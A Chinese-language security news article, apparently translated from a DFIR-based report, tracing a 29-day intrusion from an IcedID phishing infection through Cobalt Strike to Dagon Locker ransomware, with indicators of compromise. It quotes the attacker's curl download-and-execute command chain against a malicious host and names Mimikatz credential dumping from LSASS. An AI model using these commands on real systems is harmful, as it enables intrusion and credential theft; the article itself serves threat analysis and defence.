---
title: 一次勒索攻击案例追踪 | 从最初的漏洞利用到最终的部署勒索软件 历时29天
url: https://www.4hou.com/posts/lkzM
source: 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com
date: 2024-05-06
fetch_date: 2025-10-06T17:13:37.829408
---

# 一次勒索攻击案例追踪 | 从最初的漏洞利用到最终的部署勒索软件 历时29天

一次勒索攻击案例追踪 | 从最初的漏洞利用到最终的部署勒索软件 历时29天 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com

[![](https://www.4hou.com/sihou/images/new4hou/newlogoss.png)](https://www.4hou.com)

* [首页](https://www.4hou.com)
* [企业中心](https://www.4hou.com/corp/newindex)
* [产业研究院](https://www.4hou.com/real-time)

![](https://www.4hou.com/sihou/images/new4hou/search-icon.png)

[投稿](https://www.4hou.com/contribute)

[登录](https://www.4hou.com/login)
  |
[注册](https://www.4hou.com/register)

* 导读 ▾
* [活动](https://www.4hou.com/newticket)
* [专题](https://www.4hou.com/category/special)
* [图谱](https://www.4hou.com/atlas/index)
* [报告](https://www.4hou.com/new-report-info)
* [嘶票](https://www.4hou.com/tickets)
* [嘶货](https://www.4hou.com/shop)
* [企业查询](https://www.4hou.com/corp/new-search-company)
* [招聘](https://www.4hou.com/recruit)![](https://www.4hou.com/sihou/images/1561626446625934.png)

* [新闻](https://www.4hou.com/category/news)
* [行业](https://www.4hou.com/category/industry)
* [趋势](https://www.4hou.com/category/observation)
* [访谈](https://www.4hou.com/category/people)
* [漏洞](https://www.4hou.com/category/vulnerable)
* [WEB安全](https://www.4hou.com/category/web)
* [业务安全](https://www.4hou.com/category/business)
* [系统安全](https://www.4hou.com/category/system)
* [内网渗透](https://www.4hou.com/category/penetration)
* [勒索软件](https://www.4hou.com/category/typ)
* [安全工具](https://www.4hou.com/category/tools)

# 一次勒索攻击案例追踪 | 从最初的漏洞利用到最终的部署勒索软件 历时29天

山卡拉
[勒索软件](https://www.4hou.com/category/typ)
2024-05-05 11:00:00

![](https://img.4hou.com/article/%E6%B5%8F%E8%A7%88.png)1596331

收藏

导语：网络安全专家仔细追踪了一次复杂的勒索软件攻击的时间线，从最初的漏洞利用到部署 Dagon Locker 勒索软件历时了 29 天。

网络安全专家仔细追踪了一次复杂的勒索软件攻击的时间线，从最初的漏洞利用到部署 Dagon Locker 勒索软件历时了 29 天。

该案例研究不仅阐明了网络犯罪分子的效率和持久性，还强调了组织当今面临的网络威胁不断变化的情况。

**演变与升级**

这次攻击始于通过 IcedID 进行网络渗透。IcedID 是一种臭名昭著的恶意软件，最初设计用于银行欺诈，但后来演变为一种用于更广泛网络犯罪活动的多功能工具。

该恶意软件通过欺骗性电子邮件传播，诱使员工下载恶意 JavaScript 文件。

一旦进入系统，IcedID 通过与命令和控制服务器通信建立立足点，为进一步的恶意活动奠定基础。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240430/1714448088312129.png "1714445675481587.png")

执行

**工具部署**

在接下来的几天里，攻击者部署了各种工具来保持持久性并在网络上横向移动。

Rclone、Netscan、Nbtscan、AnyDesk、Seatbelt、Sharefinder 和 AdFind 用于侦察网络环境并为最终有效负载做好准备。

此阶段至关重要，因为它允许攻击者绘制网络图、识别有价值的目标并战略性地规划勒索软件部署。

本案例研究根据 DFIR 报告的见解对每个攻击阶段进行了详细分析。

攻击者最初通过 IcedID 恶意软件获得访问权限，通常通过包含恶意附件或链接的网络钓鱼电子邮件进行分发。

此阶段的主要目标是在网络内建立立足点而不发出警报。

**执行**

初次访问后，恶意软件会在主机系统中永久安装脚本，为部署更多有效负载和更深层次的网络渗透奠定了基础。

当用户执行下载的 JavaScript 文件 Document\_Scan\_468.js 时，以下步骤会发生：

1.使用 curl 命令创建 bat 文件以从 moashraya[.]com 下载 IcedID 有效负载。

```
C:\Windows\System32\cmd.exe” /c echo curl https://moashraya[.]com/out/t.php –output “%temp%\magni.waut.a” –ssl no-revoke –insecure –location > “%temp%\magni.w.bat
```

2.执行批处理脚本。

```
cmd.exe /c “%temp%\magnu.w.bat”
```

3.下载后，文件 magni.waut.a 被重命名为 magni.w。

```
cmd.exe /c ren “%temp%\magni.waut.a” “magni.w”
```

4.使用 rundll32.exe，它使用下载并重命名的文件 magni.w 中的参数 \k arabika752 执行函数 scab。

```
rundll32 “%temp%\magni.w”, scab \k arabika752
```

攻击者通过使用复杂的持久性机制（例如注册表修改和计划任务）来确保他们继续存在于网络中。

威胁行为者在不同的服务器上创建了多个计划任务，以实现 Cobalt Strike 的持久执行。计划任务文件由 svchost 注入的进程创建。

如下所示，计划任务文件是由 svchost 注入的进程创建的。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240430/1714448089201585.png "1714445716204661.png")

计划任务文件是由 svchost 注入进程创建的

这使得他们即使在重新启动或尝试清理的情况下也能保持对受感染系统的控制。

**权限提升**

攻击者利用系统漏洞和错误配置来获取更高级别的权限。

当威胁参与者创建新用户帐户时，他们将其添加到特权活动目录组中。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240430/1714448090507856.png "1714445750135657.png")

特权活动目录组

提升的权限使他们能够操纵系统进程并访问网络的受限区域。

攻击者采用各种技术来避免检测，包括混淆其恶意软件、禁用安全措施以及使用合法的管理工具。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240430/1714448091136252.png "1714445773336851.png")

IcedID 将自身注入 svchost.exe

这些行动有助于保持攻击的隐秘性，使其能够不受阻碍地进行。

Cobalt Strike 提供了一套工具，用于从 LSASS（本地安全机构子系统服务）进程检索散列凭据，包括“logonpassword”命令。

该命令使用 Mimikatz 模块“sekurlsa::logonpasswords”直接从系统内存中提取凭据。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240430/1714448092505284.png "1714445808152116.png")

Sysmon 正确，允许跟踪对 LSASS 内存的访问

为了有效地监控和识别此类未经授权的活动，必须实施和微调系统监控实用程序 Sysmon。

正确配置 Sysmon 可以监控访问 LSASS 内存的尝试，这是检测潜在凭据盗窃的关键步骤，如附图所示。

对凭据的访问促进了对系统和数据的未经授权访问，从而增加了攻击者对网络的控制。

一旦进入网络，攻击者就会进行监视以识别有价值的资产和数据。

在本报告详细介绍的执行阶段，我们观察到 IcedID 恶意软件注入父进程 svchost.exe，随后执行凭据提取。

此行为是一个重要的观察结果，将恶意软件与 LSASS 进程的未经授权访问联系起来。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240430/1714448092495037.png "1714445840189529.png")

这些信息指导了他们在受感染环境中的后续行动和目标选择。

**横向移动**

攻击者使用窃取的凭据和工具在网络中横向移动。

为了促进跨不同系统的横向移动，威胁行为者利用了 Cobalt Strike 信标中的“jump winrm”功能，该功能利用了 Windows PowerShell 远程协议 (MS-PSRP)。

这种方法强调了内置网络协议的复杂使用来扩大攻击范围。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240430/1714448093913271.png "1714445871136474.png")

内置网络协议扩大攻击范围

从受感染服务器的内存中提取 – 显示 Cobalt Strike 信标执行此类横向移动时执行的进程。

横向移动使他们能够扩大影响范围并危及其他系统。

**收藏**

在入侵过程中，威胁参与者瞄准并访问了与 IT 部门相关的多个文件。

此外，他们还使用通过 Cobalt Strike 信标执行的 PowerShell 命令从域控制器转储和窃取 Windows 安全事件日志。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240430/1714448094196857.png "1714445917181185.png")

**命令与控制**

在此入侵期间，持续时间延长和网络不稳定导致缺乏一些典型可用的网络工件，从而导致数据中存在潜在的缺口。

仅在入侵的前两天检测到 IcedID 的命令和控制流量。相反，Cobalt Strike 指挥和控制流量从第二天开始，并在整个入侵过程中持续存在。

对从前面提到的 PowerShell 脚本中提取的 Cobalt Strike 配置的分析揭示了威胁行为者采用的几种策略：

**·** 他们选择了合法的 Windows 进程 gpupdate.exe 来注入 Cobalt Strike shellcode。

**·**他们利用 Early Bird APC 队列注入技术来绕过安全措施。

**·**他们试图将 Cobalt Strike 流量伪装成与 cloudfront.amazonaws.com 的合法连接。

**·**他们配置了三个 IP 地址作为命令和控制 (C2) 服务器。

这使他们能够发送命令、部署额外的有效负载和窃取数据。数据被泄露到攻击者控制的服务器上。

泄露带来了重大的隐私和安全风险，导致潜在的数据泄露和合规问题。Dagon Locker 勒索软件的部署导致文件和系统加密、运营停机以及由于赎金要求和恢复成本而造成的财务损失。

此次攻击需要全面的事件响应，包括系统恢复、加强安全态势和监管报告。

**时间线**

**·**第一天： 通过 IcedID 恶意软件进入。

**·**第 2-10 天： 建立持久性和权限升级。

**·**第 11-20 天： 侦察和横向移动。

**·**第 21-28 天： 勒索软件部署的数据收集和暂存。

**·**第 29 天：  Dagon Locker 勒索软件激活。

这次攻击体现了现代网络威胁的快速和隐蔽性。组织必须增强其网络安全框架，采取主动的威胁搜寻实践，并确保持续监控以防御此类复杂的攻击。

DFIR 报告提供的详细细分不仅阐明了特定的攻击向量，而且还可以作为网络安全社区的重要学习工具。

**指标**

**Atomic**

```
IcedID
143.110.245[.]38:443
159.89.124[.]188:443
188.114.97[.]7:443
151.236.9[.]176:443
159.223.95[.]82:443
194.58.68[.]187:443
87.251.67[.]168:443
151.236.9[.]166:443
rpgmagglader[.]com
ultrascihictur[.]com
oopscokir[.]com
restohalto[.]site
ewacootili[.]com
magiraptoy[.]com
fraktomaam[.]com
patricammote[.]com
moashraya[.]com

Cobalt Strike

23.159.160[.]88
45.15.161[.]97
51.89.133[.]3
winupdate.us[.]to
```

**Computed**

```
Document_Scan_468.js
0d8a41ec847391807acbd55cbd69338b
5066e67f22bc342971b8958113696e6c838f6c58
f6e5dbff14ef272ce07743887a16decbee2607f512ff2a9045415c8e0c05dbb4

license.dat
bff696bb76ea1db900c694a9b57a954b
ca10c09416a16416e510406a323bb97b0b0703ef
332afc80371187881ef9a6f80e5c244b44af746b20342b8722f7b56b61604953

Riadnc1.dll
a144aa7a0b98de3974c547e3a09f4fb2
34c9702c66faadb4ce90980315b666be8ce35a13
9da84133ed36960523e3c332189eca71ca42d847e2e79b78d182da8da4546830

magni.w
7e9ef45d19332c22f1f3a316035dcb1b
4e0222fd381d878650c9ebeb1bcbbfdfc34cabc5
839cf7905dc3337bebe7f8ba127961e6cd40c52ec3a1e09084c9c1ccd202418e

magni.w.bat
b3495023a3a664850e1e5e174c4b1b08
38cd9f715584463b4fdecfbac421d24077e90243
65edf9bc2c15ef125ff58ac597125b040c487640860d84eea93b9ef6b5bb8ca6

update.dll
628685be0f42072d2b5150d4809e63fc
437fe3b6fdc837b9ee47d74eb1956def2350ed7e
a0191a300263167506b9b5d99575c4049a778d1a8ded71dcb8072e87f5f0bbcf
```

本文翻译自：https://gbhackers.com/hackers-tool-29-sabotage-ransomware-attack/如若转载，请注明原文地址

* 分享至

![取消](https://www.4hou.com/sihou/images/close.jpg)
![嘶吼](https://www.4hou.com/sihou/images/logo.png)

感谢您的支持，我会继续努力的!

![扫码支持]( "扫一扫")

打开微信扫一扫后点击右上角即可分享哟

### 发表评论

评论

![](https://www.4hou.com/captcha/flat?DZhKAauc)

#### 你可能感兴趣的

* [![]()

  一次勒索攻击案例追踪 | 从最初的漏洞利用到最终的部署勒索软件 历时29天](https://www.4hou.com/posts/lkzM)
* [![]()

  黑客碟中谍：LockBit 3.0 勒索软件构建器泄露导致出现数百个新变体](https://www.4hou.com/posts/YYnn)
* [![]()

  Cuba勒索软件（又名Tropical Scorpius）的最新攻击策略](https://www.4hou.com/posts/vJDX)
* [![]()

  新出现的HavanaCrypt 勒索软件冒充谷歌软件更新应用程序传播](https://www.4hou.com/posts/nJz7)
* [![]()

  REvil勒索软件最新技术迭代分析](https:/...